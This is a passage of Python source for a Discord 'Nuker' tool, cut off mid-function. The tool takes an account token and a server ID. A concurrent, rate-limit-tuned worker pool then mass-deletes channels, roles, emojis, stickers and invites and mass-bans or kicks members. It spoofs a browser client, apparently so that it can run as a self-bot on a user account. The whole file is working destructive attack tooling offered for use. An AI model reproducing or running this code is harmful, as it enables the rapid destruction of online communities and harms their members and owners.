import asyncio
import getpass
import importlib.util
import itertools
import os
import random
import signal
import sys
import time
from collections import deque
from typing import Any, AsyncIterator, Callable, Deque, Dict, List, Optional, Tuple

import httpx

Reset = "\033[0m"
Bold = "\033[1m"
Gray = "\033[90m"
White = "\033[37m"
BrightRed = "\033[91m"
BrightGreen = "\033[92m"
BrightYellow = "\033[93m"
BrightBlue = "\033[94m"
BrightMagenta = "\033[95m"
BrightCyan = "\033[96m"
Orange = "\033[38;5;208m"
Purple = "\033[38;5;135m"
Pink = "\033[38;5;213m"
Teal = "\033[38;5;51m"
Lime = "\033[38;5;154m"

ApiBase = "https://discord.com/api/v10"
MaxRetries = 5
InitialWorkers = 24
MinWorkers = 12
MaxWorkers = 40
JitterMin = 0.003
JitterMax = 0.020
BackoffBase = 0.10
BackoffMax = 2.5
ConnectTimeout = 3.5
ReadTimeout = 10.0
WriteTimeout = 10.0
PoolTimeout = 3.5
MaxConnections = 120
MaxKeepalive = 60
KeepaliveExpiry = 30.0
ProgressInterval = 0.35
AutotuneInterval = 1.2
AutotuneLogCooldown = 8.0
MemberPageSize = 1000
MaxConsecutiveMemberErrors = 3
GlobalRateLimitCap = 90.0
QueueGetTimeout = 1.0
WorkerStaggerMax = 0.04
AutotuneUpStep = 3
AutotuneDownFactor = 0.75
AutotuneRateLimitThreshold = 0.25
AutotuneSuccessThreshold = 15

PermKickMembers = 1 << 1
PermBanMembers = 1 << 2
PermAdministrator = 1 << 3
PermManageChannels = 1 << 4
PermManageGuild = 1 << 5
PermManageRoles = 1 << 28
PermManageWebhooks = 1 << 29
PermManageGuildExpressions = 1 << 30

Stats: Dict[str, Any] = {
    "Done": 0,
    "Already": 0,
    "Failed": 0,
    "Retries": 0,
    "RateLimits": 0,
    "StartTime": 0.0,
}

StatsLock: Optional[asyncio.Lock] = None
StopEvent: Optional[asyncio.Event] = None


def SafePrint(Text: str, End: str = "\n") -> None:
    try:
        print(Text, end=End, flush=True)
    except UnicodeEncodeError:
        try:
            print(Text.encode("ascii", "ignore").decode("ascii"), end=End, flush=True)
        except Exception:
            pass
    except Exception:
        pass


def Box(Title: str, Message: str, Color: str = BrightCyan) -> None:
    SafePrint("\r\033[K", End="")
    SafePrint("")
    SafePrint(
        f"{Purple}┌─ {Color}{Bold}{Title}{Reset} "
        f"{Purple}───────────────────────────────────────────────────┐{Reset}"
    )
    for Line in str(Message).split("\n"):
        if Line:
            SafePrint(f"{Purple}│{Reset} {Color}{Line}{Reset}")
    SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
    SafePrint("")


def ErrorBox(Message: str) -> None:
    Box("Error", Message, BrightRed)


def InfoBox(Message: str) -> None:
    Box("Info", Message, BrightCyan)


def WarningBox(Message: str) -> None:
    Box("Warning", Message, BrightYellow)


def SafeClear() -> None:
    try:
        os.system("cls" if os.name == "nt" else "clear")
    except Exception:
        pass


async def SafeSleep(Seconds: float) -> None:
    await asyncio.sleep(max(0.0, min(120.0, Seconds)))


def SafeRandomUniform(Low: float, High: float) -> float:
    try:
        if Low > High:
            Low, High = High, Low
        return random.uniform(Low, High)
    except Exception:
        return JitterMin


def SafeInt(Value: Any, Default: int = 0) -> int:
    try:
        return int(Value)
    except (ValueError, TypeError, OverflowError):
        return Default


def SafeFloat(Value: Any, Default: float = 0.0) -> float:
    try:
        return float(Value)
    except (ValueError, TypeError, OverflowError):
        return Default


def SafeJson(Response: httpx.Response) -> Any:
    try:
        return Response.json()
    except Exception:
        return None


def SafeGet(Mapping: Any, Key: str, Default: Any = None) -> Any:
    if not isinstance(Mapping, dict):
        return Default
    return Mapping.get(Key, Default)


def SafeDiv(Numerator: float, Denominator: float, Default: float = 0.0) -> float:
    if Denominator == 0:
        return Default
    return Numerator / Denominator


def SafeInput(Prompt: str) -> str:
    try:
        return input(Prompt).strip()
    except (EOFError, UnicodeDecodeError):
        return ""


def SafeGetpass(Prompt: str) -> str:
    try:
        import pwinput
        return pwinput.pwinput(prompt=Prompt, mask="*").strip()
    except ImportError:
        pass
    except Exception:
        pass
    try:
        return getpass.getpass(prompt=Prompt).strip()
    except Exception:
        return ""


def Backoff(Attempt: int) -> float:
    Exponential = min(BackoffBase * (2 ** Attempt), BackoffMax)
    return Exponential + SafeRandomUniform(JitterMin, JitterMax)


def IsMutating(Method: str) -> bool:
    return Method.upper() in ("DELETE", "PUT", "POST", "PATCH")


def CheckHttp2() -> bool:
    if importlib.util.find_spec("h2") is None:
        ErrorBox("Missing Dependency H2\nInstall With: pip install httpx[http2]")
        return False
    return True


class Nuker:
    def __init__(self, Token: str, GuildId: str) -> None:
        self.Token = Token
        self.GuildId = GuildId
        self.Headers: Dict[str, str] = {
            "Authorization": Token,
            "Content-Type": "application/json",
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/134.0.0.0 Safari/537.36"
            ),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "X-Super-Properties": (
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xv"
                "Y2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3"
                "MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgTGlrZSBH"
                "ZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjo"
                "iMTM0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIi"
                "wiY2xpZW50X2J1aWxkX251bWJlciI6MzAwMDAwfQ=="
            ),
        }
        self.Client: Optional[httpx.AsyncClient] = None
        self.Queue: Optional[asyncio.Queue[Tuple[str, str, Optional[Dict[str, Any]]]]] = None
        self.Cache: Dict[str, Optional[List[Any]]] = {"Channels": None, "Roles": None}
        self.User: Optional[Dict[str, Any]] = None
        self.Guild: Optional[Dict[str, Any]] = None
        self.Permissions: int = 0
        self.IsOwner: bool = False
        self.IsAdmin: bool = False
        self.UserHighestRolePosition: int = -1
        self.UserRoleIds: set = set()
        self.RolePositions: Dict[str, int] = {}
        self.RoleCache: Dict[str, Dict[str, Any]] = {}
        self.MemberHighestCache: Dict[str, int] = {}
        self.GuildOwnerId: Optional[str] = None

    async def __aenter__(self) -> "Nuker":
        self.Queue = asyncio.Queue()
        Limits = httpx.Limits(
            max_connections=MaxConnections,
            max_keepalive_connections=MaxKeepalive,
            keepalive_expiry=KeepaliveExpiry,
        )
        Timeout = httpx.Timeout(
            connect=ConnectTimeout,
            read=ReadTimeout,
            write=WriteTimeout,
            pool=PoolTimeout,
        )
        self.Client = httpx.AsyncClient(
            timeout=Timeout,
            limits=Limits,
            headers=self.Headers,
            http2=True,
            follow_redirects=True,
        )
        return self

    async def __aexit__(self, *Args: Any) -> None:
        try:
            if self.Client is not None:
                await self.Client.aclose()
        except Exception:
            pass

    async def ValidateToken(self) -> bool:
        try:
            Response = await self.Request("GET", f"{ApiBase}/users/@me")
            if Response is not None and Response.status_code == 200:
                Data = SafeJson(Response)
                if isinstance(Data, dict):
                    self.User = Data
                    return True
            return False
        except Exception:
            return False

    async def ValidateGuild(self) -> bool:
        try:
            Response = await self.Request("GET", f"{ApiBase}/guilds/{self.GuildId}")
            if Response is not None and Response.status_code == 200:
                Data = SafeJson(Response)
                if isinstance(Data, dict):
                    self.Guild = Data
                    return True
            return False
        except Exception:
            return False

    async def ValidatePermissions(self) -> bool:
        try:
            if not self.Guild or not self.User:
                return False
            MyId = SafeGet(self.User, "id")
            if not MyId:
                return False
            if SafeGet(self.Guild, "owner_id") == MyId:
                self.IsOwner = True
                self.IsAdmin = True
                self.Permissions = 0xFFFFFFFFFFFFFFFF
                return True
            Response = await self.Request("GET", f"{ApiBase}/guilds/{self.GuildId}/roles")
            if Response is None or Response.status_code != 200:
                return False
            AllRoles = SafeJson(Response)
            if not isinstance(AllRoles, list):
                return False
            ResponseMember = await self.Request(
                "GET", f"{ApiBase}/guilds/{self.GuildId}/members/{MyId}"
            )
            if ResponseMember is None:
                return False
            if ResponseMember.status_code != 200:
                self.Permissions = 0
                self.IsAdmin = False
                return True
            Member = SafeJson(ResponseMember)
            if not isinstance(Member, dict):
                self.Permissions = 0
                self.IsAdmin = False
                return True
            MyRoles = set(SafeGet(Member, "roles", []) or [])
            Accumulated = 0
            for Role in AllRoles:
                if not isinstance(Role, dict):
                    continue
                RoleId = SafeGet(Role, "id")
                if not RoleId:
                    continue
                RolePerms = SafeInt(SafeGet(Role, "permissions", 0), 0)
                if RoleId == self.GuildId or RoleId in MyRoles:
                    Accumulated |= RolePerms
            self.Permissions = Accumulated
            self.IsAdmin = bool(Accumulated & PermAdministrator)
            return True
        except Exception:
            return False

    async def LoadHierarchy(self) -> bool:
        try:
            if not self.User or not self.Guild:
                return False
            self.GuildOwnerId = SafeGet(self.Guild, "owner_id")
            MyId = SafeGet(self.User, "id")
            if not MyId:
                return False
            RolesResp = await self.Request("GET", f"{ApiBase}/guilds/{self.GuildId}/roles")
            if RolesResp is None or RolesResp.status_code != 200:
                return False
            Roles = SafeJson(RolesResp)
            if not isinstance(Roles, list):
                return False
            self.RolePositions.clear()
            self.RoleCache.clear()
            for Role in Roles:
                if not isinstance(Role, dict):
                    continue
                Rid = SafeGet(Role, "id")
                if not Rid:
                    continue
                self.RolePositions[Rid] = SafeInt(SafeGet(Role, "position", 0), 0)
                self.RoleCache[Rid] = Role
            MemberResp = await self.Request(
                "GET", f"{ApiBase}/guilds/{self.GuildId}/members/{MyId}"
            )
            if MemberResp is None or MemberResp.status_code != 200:
                return False
            Member = SafeJson(MemberResp)
            if not isinstance(Member, dict):
                return False
            self.UserRoleIds = set(SafeGet(Member, "roles", []) or [])
            Highest = 0
            for Rid in self.UserRoleIds:
                Highest = max(Highest, self.RolePositions.get(Rid, 0))
            if MyId == self.GuildOwnerId:
                self.UserHighestRolePosition = 1 << 30
            else:
                self.UserHighestRolePosition = Highest
            return True
        except Exception:
            return False

    def HasPerm(self, Flag: int) -> bool:
        if self.Permissions & PermAdministrator:
            return True
        return bool(self.Permissions & Flag)

    def IsGuildOwner(self) -> bool:
        return bool(
            self.User
            and self.Guild
            and SafeGet(self.User, "id") == SafeGet(self.Guild, "owner_id")
        )

    def CanManageRole(self, RoleId: str) -> Tuple[bool, str]:
        if not self.HasPerm(PermManageRoles):
            return False, "Missing Manage Roles"
        Role = self.RoleCache.get(RoleId)
        if not Role:
            return False, "Role Not Cached"
        if SafeGet(Role, "managed", False):
            return False, "Role Is Managed"
        if RoleId == self.GuildId:
            return False, "Cannot Modify @everyone"
        if self.IsGuildOwner():
            return True, ""
        TargetPos = self.RolePositions.get(RoleId, 0)
        if TargetPos >= self.UserHighestRolePosition:
            return False, f"Role Position {TargetPos} >= User {self.UserHighestRolePosition}"
        return True, ""

    def GetMemberHighestPosition(self, Member: Dict[str, Any]) -> int:
        UserId = SafeGet(SafeGet(Member, "user", {}), "id")
        if UserId == self.GuildOwnerId:
            return 1 << 30
        Roles = SafeGet(Member, "roles", []) or []
        Highest = 0
        for Rid in Roles:
            Highest = max(Highest, self.RolePositions.get(Rid, 0))
        return Highest

    def CanManageMember(self, Member: Dict[str, Any]) -> Tuple[bool, str]:
        UserId = SafeGet(SafeGet(Member, "user", {}), "id")
        if not UserId:
            return False, "Missing User Id"
        if UserId == self.GuildOwnerId:
            return False, "Target Is Guild Owner"
        if UserId == SafeGet(self.User, "id"):
            return False, "Target Is Self"
        if self.IsGuildOwner():
            return True, ""
        TargetPos = self.GetMemberHighestPosition(Member)
        if TargetPos >= self.UserHighestRolePosition:
            return False, f"Member Position {TargetPos} >= User {self.UserHighestRolePosition}"
        return True, ""

    def CacheMemberPosition(self, Member: Dict[str, Any]) -> None:
        Uid = SafeGet(SafeGet(Member, "user", {}), "id")
        if Uid:
            self.MemberHighestCache[Uid] = self.GetMemberHighestPosition(Member)

    async def ValidateAll(self) -> bool:
        SafePrint("")
        SafePrint(
            f"{Purple}┌─ {BrightMagenta}{Bold}Validation{Reset} "
            f"{Purple}───────────────────────────────────────────────┐{Reset}"
        )
        if not self.Token:
            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Token: Required{Reset}")
            SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
            return False
        if not await self.ValidateToken():
            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Token: Invalid{Reset}")
            SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
            return False
        Username = SafeGet(self.User, "username", "Unknown")
        Discriminator = SafeGet(self.User, "discriminator", "0")
        DisplayName = f"{Username}#{Discriminator}" if Discriminator != "0" else Username
        SafePrint(f"{Purple}│{Reset} {BrightGreen}✔ Token: {Teal}{Bold}{DisplayName}{Reset}")
        if not self.GuildId:
            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Guild: Required{Reset}")
            SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
            return False
        if not self.GuildId.isdigit():
            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Guild: Invalid ID Format{Reset}")
            SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
            return False
        if not await self.ValidateGuild():
            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Guild: Not Found{Reset}")
            SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
            return False
        SafePrint(
            f"{Purple}│{Reset} {BrightGreen}✔ Guild: {Teal}{Bold}"
            f"{SafeGet(self.Guild, 'name', 'Unknown')}{Reset}"
        )
        if not await self.ValidatePermissions():
            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Permissions: Could Not Fetch{Reset}")
            SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
            return False
        if not await self.LoadHierarchy():
            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Hierarchy: Could Not Load{Reset}")
            SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
            return False
        if self.IsOwner:
            SafePrint(f"{Purple}│{Reset} {BrightGreen}✔ Permissions: {Teal}{Bold}Owner{Reset}")
        elif self.IsAdmin:
            SafePrint(f"{Purple}│{Reset} {BrightGreen}✔ Permissions: {Teal}{Bold}Administrator{Reset}")
        else:
            SafePrint(
                f"{Purple}│{Reset} {BrightYellow}⚠ Permissions: "
                f"{Teal}{Bold}Limited{Reset}"
            )
        Checks = [
            ("Manage Channels", PermManageChannels),
            ("Manage Roles", PermManageRoles),
            ("Manage Guild", PermManageGuild),
            ("Manage Webhooks", PermManageWebhooks),
            ("Manage Expressions", PermManageGuildExpressions),
            ("Ban Members", PermBanMembers),
            ("Kick Members", PermKickMembers),
        ]
        Granted = [Name for Name, Flag in Checks if self.HasPerm(Flag)]
        Missing = [Name for Name, Flag in Checks if not self.HasPerm(Flag)]
        SafePrint(
            f"{Purple}│{Reset} {BrightGreen}✔ Granted:{Reset} "
            f"{Teal}{', '.join(Granted) or 'None'}{Reset}"
        )
        if Missing:
            SafePrint(
                f"{Purple}│{Reset} {BrightYellow}⚠ Missing:{Reset} "
                f"{Gray}{', '.join(Missing)}{Reset}"
            )
        if self.IsOwner:
            HierLabel = "Owner"
        else:
            HierLabel = f"Position {self.UserHighestRolePosition}"
        SafePrint(
            f"{Purple}│{Reset} {BrightBlue}⌂ Hierarchy:{Reset} "
            f"{Teal}{HierLabel}{Reset}"
        )
        SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
        return True

    async def Request(
        self,
        Method: str,
        Url: str,
        JsonPayload: Optional[Dict[str, Any]] = None,
    ) -> Optional[httpx.Response]:
        try:
            if StopEvent is None or StopEvent.is_set():
                return None
            if StatsLock is None or self.Client is None:
                return None
            Mutating = IsMutating(Method)
            for Attempt in range(MaxRetries):
                if StopEvent is None or StopEvent.is_set():
                    return None
                try:
                    Response = await self.Client.request(Method, Url, json=JsonPayload)
                except (httpx.RequestError, asyncio.TimeoutError):
                    async with StatsLock:
                        Stats["Retries"] += 1
                    await SafeSleep(Backoff(Attempt))
                    continue
                except Exception:
                    return None
                Status = Response.status_code
                if Status in (200, 201, 204):
                    if Mutating:
                        async with StatsLock:
                            Stats["Done"] += 1
                    return Response
                if Status == 404:
                    if Mutating:
                        async with StatsLock:
                            Stats["Already"] += 1
                    return Response
                if Status == 429:
                    Body = SafeJson(Response) or {}
                    RetryAfter = SafeFloat(Body.get("retry_after", 1.0), 1.0)
                    Scope = Response.headers.get("X-RateLimit-Scope", "")
                    try:
                        HeaderRetry = Response.headers.get("Retry-After")
                        if HeaderRetry is not None:
                            RetryAfter = max(RetryAfter, SafeFloat(HeaderRetry, RetryAfter))
                    except Exception:
                        pass
                    IsGlobal = bool(Body.get("global", False)) or Scope == "global"
                    async with StatsLock:
                        Stats["RateLimits"] += 1
                        Stats["Retries"] += 1
                    SleepTime = RetryAfter + SafeRandomUniform(JitterMin, JitterMax)
                    if IsGlobal:
                        WarningBox(f"Global Rate Limit — Sleeping {SleepTime:.2f}s")
                    await asyncio.sleep(min(SleepTime, GlobalRateLimitCap))
                    continue
                if Status in (401, 403):
                    if Mutating:
                        async with StatsLock:
                            Stats["Failed"] += 1
                    return Response
                if Status in (500, 502, 503, 504):
                    async with StatsLock:
                        Stats["Retries"] += 1
                    await SafeSleep(Backoff(Attempt))
                    continue
                if Mutating:
                    async with StatsLock:
                        Stats["Failed"] += 1
                return Response
            if Mutating:
                async with StatsLock:
                    Stats["Failed"] += 1
            return None
        except Exception:
            return None

    async def GetChannels(self) -> List[Any]:
        if self.Cache["Channels"] is not None:
            return self.Cache["Channels"]
        Response = await self.Request("GET", f"{ApiBase}/guilds/{self.GuildId}/channels")
        if Response is not None and Response.status_code == 200:
            Data = SafeJson(Response)
            if isinstance(Data, list):
                self.Cache["Channels"] = Data
                return Data
        return []

    async def GetRoles(self) -> List[Any]:
        if self.Cache["Roles"] is not None:
            return self.Cache["Roles"]
        Response = await self.Request("GET", f"{ApiBase}/guilds/{self.GuildId}/roles")
        if Response is not None and Response.status_code == 200:
            Data = SafeJson(Response)
            if isinstance(Data, list):
                self.Cache["Roles"] = Data
                return Data
        return []

    async def IterMembers(self) -> AsyncIterator[Dict[str, Any]]:
        After = "0"
        ConsecutiveErrors = 0
        while True:
            if StopEvent is None or StopEvent.is_set():
                return
            Response = await self.Request(
                "GET",
                f"{ApiBase}/guilds/{self.GuildId}/members?limit={MemberPageSize}&after={After}",
            )
            if not Response:
                return
            if Response.status_code in (401, 403):
                return
            if Response.status_code != 200:
                ConsecutiveErrors += 1
                if ConsecutiveErrors >= MaxConsecutiveMemberErrors:
                    return
                await SafeSleep(Backoff(ConsecutiveErrors))
                continue
            ConsecutiveErrors = 0
            Batch = SafeJson(Response)
            if not isinstance(Batch, list) or not Batch:
                return
            for Member in Batch:
                if isinstance(Member, dict):
                    self.CacheMemberPosition(Member)
                    yield Member
            try:
                LastUserId = Batch[-1]["user"]["id"]
            except (KeyError, TypeError, IndexError):
                return
            After = LastUserId
            if len(Batch) < MemberPageSize:
                return


class WorkerPool:
    def __init__(self, NukerInstance: Nuker) -> None:
        self.NukerInstance = NukerInstance
        self.CurrentWorkers = InitialWorkers
        self.Tasks: Deque[asyncio.Task[None]] = deque()
        self.PoolLock = asyncio.Lock()
        self.LastAutotuneLog: float = 0.0

    async def Worker(self, Stagger: float = 0.0) -> None:
        try:
            if Stagger > 0:
                try:
                    await SafeSleep(Stagger)
                except asyncio.CancelledError:
                    return
            while True:
                if StopEvent is None or StopEvent.is_set():
                    return
                try:
                    Method, Url, Payload = await asyncio.wait_for(
                        self.NukerInstance.Queue.get(),
                        timeout=QueueGetTimeout,
                    )
                except asyncio.TimeoutError:
                    continue
                except asyncio.CancelledError:
                    return
                try:
                    await self.NukerInstance.Request(Method, Url, Payload)
                except asyncio.CancelledError:
                    raise
                except Exception:
                    pass
                finally:
                    try:
                        self.NukerInstance.Queue.task_done()
                    except Exception:
                        pass
        except asyncio.CancelledError:
            raise
        except Exception:
            return

    async def Start(self) -> None:
        for _ in range(self.CurrentWorkers):
            Stagger = SafeRandomUniform(0.0, WorkerStaggerMax)
            self.Tasks.append(asyncio.create_task(self.Worker(Stagger=Stagger)))

    async def Autotune(self) -> None:
        LastDone = 0
        LastRateLimit = 0
        while True:
            if StopEvent is None or StopEvent.is_set():
                return
            try:
                await SafeSleep(AutotuneInterval)
            except asyncio.CancelledError:
                return
            Now = time.time()
            async with StatsLock:
                DoneDelta = Stats["Done"] - LastDone
                RateLimitDelta = Stats["RateLimits"] - LastRateLimit
                LastDone = Stats["Done"]
                LastRateLimit = Stats["RateLimits"]
            LogMessage: Optional[str] = None
            async with self.PoolLock:
                LiveTasks = deque(Task for Task in self.Tasks if not Task.done())
                self.Tasks = LiveTasks
                if (
                    RateLimitDelta > DoneDelta * AutotuneRateLimitThreshold
                    and self.CurrentWorkers > MinWorkers
                ):
                    NewCount = max(MinWorkers, int(self.CurrentWorkers * AutotuneDownFactor))
                    if NewCount < self.CurrentWorkers:
                        Excess = len(self.Tasks) - NewCount
                        for _ in range(max(0, Excess)):
                            try:
                                Task = self.Tasks.pop()
                                Task.cancel()
                            except Exception:
                                pass
                        Old = self.CurrentWorkers
                        self.CurrentWorkers = NewCount
                        if Now - self.LastAutotuneLog >= AutotuneLogCooldown:
                            self.LastAutotuneLog = Now
                            LogMessage = f"Auto Tune Down — {Old} → {NewCount}"
                elif (
                    RateLimitDelta == 0
                    and DoneDelta > AutotuneSuccessThreshold
                    and self.CurrentWorkers < MaxWorkers
                ):
                    NewCount = min(MaxWorkers, self.CurrentWorkers + AutotuneUpStep)
                    ToSpawn = NewCount - len(self.Tasks)
                    for _ in range(max(0, ToSpawn)):
                        self.Tasks.append(
                            asyncio.create_task(
                                self.Worker(Stagger=SafeRandomUniform(0.0, WorkerStaggerMax))
                            )
                        )
                    Old = self.CurrentWorkers
                    self.CurrentWorkers = NewCount
                    if Now - self.LastAutotuneLog >= AutotuneLogCooldown:
                        self.LastAutotuneLog = Now
                        LogMessage = f"Auto Tune Up — {Old} → {NewCount}"
            if LogMessage:
                InfoBox(LogMessage)

    async def Stop(self) -> None:
        async with self.PoolLock:
            TasksSnapshot = list(self.Tasks)
            self.Tasks.clear()
        for Task in TasksSnapshot:
            try:
                Task.cancel()
            except Exception:
                pass
        if TasksSnapshot:
            await asyncio.gather(*TasksSnapshot, return_exceptions=True)


def FormatBar(Done: int, Total: int, Width: int = 30) -> str:
    Width = max(0, min(200, Width))
    if Total <= 0:
        return f"{Purple}[{' ' * Width}]{Reset}"
    Done = max(0, min(Done, Total))
    Percent = SafeDiv(Done, Total, 0)
    Filled = max(0, min(Width, int(Width * Percent)))
    Color = BrightRed if Percent < 0.33 else Orange if Percent < 0.66 else BrightGreen
    Bar = f"{Color}{'█' * Filled}{Purple}{'░' * (Width - Filled)}{Reset}"
    return f"{Purple}[{Reset}{Bar}{Purple}]{Reset}"


async def ProgressReporter(Total: int) -> None:
    LastSettled = 0
    LastTime = time.time()
    while True:
        if StopEvent is None or StopEvent.is_set():
            return
        try:
            await SafeSleep(ProgressInterval)
        except asyncio.CancelledError:
            return
        Now = time.time()
        async with StatsLock:
            Done = Stats["Done"]
            Already = Stats["Already"]
            Failed = Stats["Failed"]
            Retries = Stats["Retries"]
            RateLimits = Stats["RateLimits"]
        Settled = Done + Already + Failed
        Delta = max(0, Settled - LastSettled)
        DeltaTime = max(0.0, Now - LastTime)
        Rate = SafeDiv(Delta, DeltaTime, 0)
        LastSettled = Settled
        LastTime = Now
        Bar = FormatBar(Settled, Total)
        Percent = max(0.0, min(100.0, SafeDiv(Settled, Total, 0) * 100))
        Remaining = max(0, Total - Settled)
        Eta = SafeDiv(Remaining, Rate, 0)
        Line = (
            f"{Bar} {Bold}{Teal}{Percent:5.1f}%{Reset} "
            f"{Purple}│{Reset} {BrightGreen}OK {Done}{Reset} "
            f"{Purple}│{Reset} {Gray}SKIP {Already}{Reset} "
            f"{Purple}│{Reset} {BrightRed}FAIL {Failed}{Reset} "
            f"{Purple}│{Reset} {BrightYellow}RL {RateLimits}{Reset} "
            f"{Purple}│{Reset} {Lime}RETRY {Retries}{Reset} "
            f"{Purple}│{Reset} {Pink}{Rate:5.1f}/s{Reset} "
            f"{Purple}│{Reset} {BrightBlue}ETA {Eta:5.0f}s{Reset}"
        )
        try:
            print(f"\r{Line}", end="", flush=True)
        except UnicodeEncodeError:
            pass


async def DeleteChannels(NukerInstance: Nuker) -> int:
    if not NukerInstance.HasPerm(PermManageChannels):
        ErrorBox("Missing Manage Channels Permission")
        return 0
    Channels = await NukerInstance.GetChannels()
    if not Channels:
        ErrorBox("No Channels Found")
        return 0
    Categories: List[Any] = []
    Others: List[Any] = []
    for Channel in Channels:
        (Categories if SafeGet(Channel, "type") == 4 else Others).append(Channel)
    Count = 0
    for Channel in itertools.chain(Others, Categories):
        ChannelId = SafeGet(Channel, "id")
        if not ChannelId:
            continue
        NukerInstance.Queue.put_nowait(("DELETE", f"{ApiBase}/channels/{ChannelId}", None))
        Count += 1
    return Count


async def DeleteRoles(NukerInstance: Nuker) -> int:
    if not NukerInstance.HasPerm(PermManageRoles):
        ErrorBox("Missing Manage Roles Permission")
        return 0
    Roles = await NukerInstance.GetRoles()
    if not Roles:
        ErrorBox("No Roles Found")
        return 0
    RealRoles: List[str] = []
    for Role in Roles:
        RoleId = SafeGet(Role, "id")
        if not RoleId or RoleId == NukerInstance.GuildId:
            continue
        if SafeGet(Role, "managed", False):
            continue
        RealRoles.append(RoleId)
    if not RealRoles:
        ErrorBox("No Roles Found")
        return 0
    Count = 0
    Skipped = 0
    for RoleId in RealRoles:
        Ok, Reason = NukerInstance.CanManageRole(RoleId)
        if not Ok:
            Skipped += 1
            continue
        NukerInstance.Queue.put_nowait(
            ("DELETE", f"{ApiBase}/guilds/{NukerInstance.GuildId}/roles/{RoleId}", None)
        )
        Count += 1
    if Skipped:
        WarningBox(f"Skipped {Skipped} Roles (Hierarchy)")
    if Count == 0:
        ErrorBox("No Eligible Roles Found")
    return Count


async def BanMembers(NukerInstance: Nuker) -> int:
    if not NukerInstance.HasPerm(PermBanMembers):
        ErrorBox("Missing Ban Members Permission")
        return 0
    Count = 0
    Skipped = 0
    Found = 0
    async for Member in NukerInstance.IterMembers():
        UserId = SafeGet(SafeGet(Member, "user", {}), "id")
        if not UserId:
            continue
        Found += 1
        Ok, Reason = NukerInstance.CanManageMember(Member)
        if not Ok:
            Skipped += 1
            continue
        NukerInstance.Queue.put_nowait(
            (
                "PUT",
                f"{ApiBase}/guilds/{NukerInstance.GuildId}/bans/{UserId}",
                {"delete_message_seconds": 0},
            )
        )
        Count += 1
    if Found == 0:
        ErrorBox("No Members Found")
        return 0
    if Skipped:
        WarningBox(f"Skipped {Skipped} Members (Hierarchy)")
    if Count == 0:
        ErrorBox("No Eligible Members Found")
    return Count


async def KickMembers(NukerInstance: Nuker) -> int:
    if not NukerInstance.HasPerm(PermKickMembers):
        ErrorBox("Missing Kick Members Permission")
        return 0
    Count = 0
    Skipped = 0
    Found = 0
    async for Member in NukerInstance.IterMembers():
        UserId = SafeGet(SafeGet(Member, "user", {}), "id")
        if not UserId:
            continue
        Found += 1
        Ok, Reason = NukerInstance.CanManageMember(Member)
        if not Ok:
            Skipped += 1
            continue
        NukerInstance.Queue.put_nowait(
            ("DELETE", f"{ApiBase}/guilds/{NukerInstance.GuildId}/members/{UserId}", None)
        )
        Count += 1
    if Found == 0:
        ErrorBox("No Members Found")
        return 0
    if Skipped:
        WarningBox(f"Skipped {Skipped} Members (Hierarchy)")
    if Count == 0:
        ErrorBox("No Eligible Members Found")
    return Count


async def DeleteEmojis(NukerInstance: Nuker) -> int:
    if not NukerInstance.HasPerm(PermManageGuildExpressions):
        ErrorBox("Missing Manage Expressions Permission")
        return 0
    Response = await NukerInstance.Request("GET", f"{ApiBase}/guilds/{NukerInstance.GuildId}/emojis")
    if not Response or Response.status_code != 200:
        return 0
    Emojis = SafeJson(Response)
    if not isinstance(Emojis, list) or not Emojis:
        ErrorBox("No Emojis Found")
        return 0
    Count = 0
    for Emoji in Emojis:
        EmojiId = SafeGet(Emoji, "id")
        if not EmojiId:
            continue
        NukerInstance.Queue.put_nowait(
            ("DELETE", f"{ApiBase}/guilds/{NukerInstance.GuildId}/emojis/{EmojiId}", None)
        )
        Count += 1
    return Count


async def DeleteStickers(NukerInstance: Nuker) -> int:
    if not NukerInstance.HasPerm(PermManageGuildExpressions):
        ErrorBox("Missing Manage Expressions Permission")
        return 0
    Response = await NukerInstance.Request("GET", f"{ApiBase}/guilds/{NukerInstance.GuildId}/stickers")
    if not Response or Response.status_code != 200:
        return 0
    Stickers = SafeJson(Response)
    if not isinstance(Stickers, list) or not Stickers:
        ErrorBox("No Stickers Found")
        return 0
    Count = 0
    for Sticker in Stickers:
        StickerId = SafeGet(Sticker, "id")
        if not StickerId:
            continue
        NukerInstance.Queue.put_nowait(
            ("DELETE", f"{ApiBase}/guilds/{NukerInstance.GuildId}/stickers/{StickerId}", None)
        )
        Count += 1
    return Count


async def DeleteInvites(NukerInstance: Nuker) -> int:
    if not NukerInstance.HasPerm(PermManageGuild):
        ErrorBox("Missing Manage Guild Permission")
        return 0
    Response = await NukerInstance.Request("GET", f"{ApiBase}/guilds/{NukerInstance.GuildId}/invites")
    if not Response or Response.status_code != 200:
        return 0
    Invites = SafeJson(Response)
